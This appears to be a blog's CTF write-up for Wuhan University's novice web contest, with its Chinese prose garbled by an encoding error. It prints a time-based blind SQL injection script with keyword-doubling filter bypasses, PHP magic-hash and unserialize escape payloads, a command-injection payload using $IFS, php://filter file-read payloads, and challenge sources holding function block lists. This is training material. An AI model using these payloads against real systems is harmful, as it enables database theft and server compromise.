      <title>WHUCTF web wp</title>
      <link href="2020/05/23/WHUCTF-web-wp/"/>
      <url>2020/05/23/WHUCTF-web-wp/</url>
      
        <content type="html"><![CDATA[<p>æ­¦æ±‰å¤§å­¦èŒæ–°èµ›çš„é¢˜ç›®ï¼Œåšåšå§ï¼</p><a id="more"></a><h2 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h2><p>æœ‰sqlè¯­å¥å›æ˜¾ï¼Œå¾ˆå‹å¥½äº†ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://218.197.154.9:10011/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=flag</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">print(mid)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">flag=flag+chr(mid)</span><br><span class="line">print(chr(mid))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url,data=data,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> flag==f1:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#x27;f1ag_y0u_wi1l_n3ver_kn0w&#x27; ),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># f111114g</span></span><br></pre></td></tr></table></figure><p>çˆ†å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(f111114g) frfromom easy_sql1.f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;num&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1st ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼šä»£ç å®¡è®¡å˜›23333&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;2nd ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can u give me the right str???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no!!!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;is str1 numeric??????&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/x/&#x27;</span>, <span class="string">&#x27;yy&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">&quot;123456&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚å¾ˆå¥½ç»•ï¼Œç›´æ¥%0aå°±è¡Œ</p><p>ç¬¬äºŒå±‚è¦æ±‚ä¸¤ä¸ªæ•°md5ä¸ç›¸ç­‰ï¼Œç»è¿‡strtrå‡½æ•°æ›¿æ¢ï¼Œè¯¥å‡½æ•°ç›¸å½“äºç”Ÿæˆä¸€ä¸ªæ›¿æ¢å­—å…¸ï¼ŒæŒ‰ç…§å­—å…¸é”®å€¼æ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment">// ç›¸å½“äº</span></span><br><span class="line"><span class="comment">// p-&gt;1 g-&gt;3 n-&gt;4 b-&gt;5</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬(ä¸æ˜¯æˆ‘å†™çš„)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">100000000</span>; $i++) &#123;</span><br><span class="line">    $md5 = strtr(md5($i), <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $i . <span class="string">&quot; &quot;</span> . md5($i) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        $count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($count == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 11230178 0e732639146814822596b49bb6939b97</span></span><br><span class="line"><span class="comment">// 20493141 0e343359461627b56649445b748588b8</span></span><br><span class="line"><span class="comment">// æ›¿æ¢å0eåé¢å‡ä¸ºçº¯æ•°å­—</span></span><br></pre></td></tr></table></figure><p>æœ€åä¸€ç‚¹ç›¸ç­‰åˆ©ç”¨phpè®¤ä¸º0eå¼€å¤´ä¸”åé¢æ˜¯çº¯æ•°å­—çš„éƒ½ç›¸ç­‰çš„ç‰¹æ€§</p><p>æœ€åä¸€å…³æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œæ­£å¸¸åºåˆ—åŒ–çš„ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;aaaaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç¡®å®šè¦æ·»åŠ çš„å†…å®¹,é•¿åº¦ä¸º20</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ—æ–¹ç¨‹ï¼Œnä¸ºxå­—ç¬¦æ•°é‡ï¼Œyä¸ºå…¶ä»–å­—ç¬¦</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+<span class="number">20</span>=<span class="number">2</span>n+y</span><br></pre></td></tr></table></figure><p>è§£å¾—n=20ï¼Œæ•…æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200523203712.png" style="zoom:67%;"><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p><h2 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no space!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;cat&#x27;t read flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥curlï¼Œechoéƒ½ç”¨ä¸äº†ï¼Œpayload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=||a=ca;b=t;<span class="variable">$a</span><span class="variable">$b</span><span class="variable">$IFS</span>`ls`</span><br></pre></td></tr></table></figure><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>è„‘æ´é¢˜ï¼Œæ‰«ç›®å½•æœ‰ï¼š<code>info.php</code>,phpinfo å¼€äº†ä¸€å¤§å †æ‰©å±•ï¼Œç«‹é©¬æƒ³åˆ°äº†phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶getshell</p><p>æ‰¾äº†åŠå¤©æ²¡æ²¡æ‰¾åˆ°åŒ…å«ç‚¹ï¼Œæœ€åå‘ç°</p><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200525135648.png" style="zoom:80%;"><p>å°±å¾ˆå¥‡æ€ªï¼Œç›´æ¥php://filterå°±èƒ½è¯»flagï¼Œå¥‡æ€ª</p><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200525135923.png" style="zoom:80%;"><h2 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h2><p>æˆ‘å¤ªèœäº†ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°</p><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200525150148.png" style="zoom: 80%;"><p>htmlæ˜¯è¿™æ ·å†™çš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acti0n&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;ä¸Šä¼ å›¾ç‰‡&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&#x27;btn&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;b1&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200525150415.png" style="zoom:67%;"><p>è‡ªåŠ¨è¿›è¡Œ302è·³è½¬</p><p>è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«çš„,æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php:<span class="comment">//filter/convert.bAse64-encode/resource=upload.php</span></span><br><span class="line">?acti0n=php:<span class="comment">//filter/string.rot13/resource=upload.php</span></span><br></pre></td></tr></table></figure><p>è¯»åˆ°æºç upload.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> error_get_last()[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to make the directory&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">chdir($dir);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $ans = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filesize too big.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filename can not be empty!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(htaccess)|(user)|(\.\.)|(%)|(#)/i&#x27;</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">        $type = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($type == <span class="string">&#x27;image/gif&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpg&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/png&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;You could not upload this image because of some dangerous code in your file!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;       </span><br><span class="line"></span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    $upload_file = $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Your file <span class="subst">$name</span> has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;ä¸Šä¼ å¤±è´¥&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p 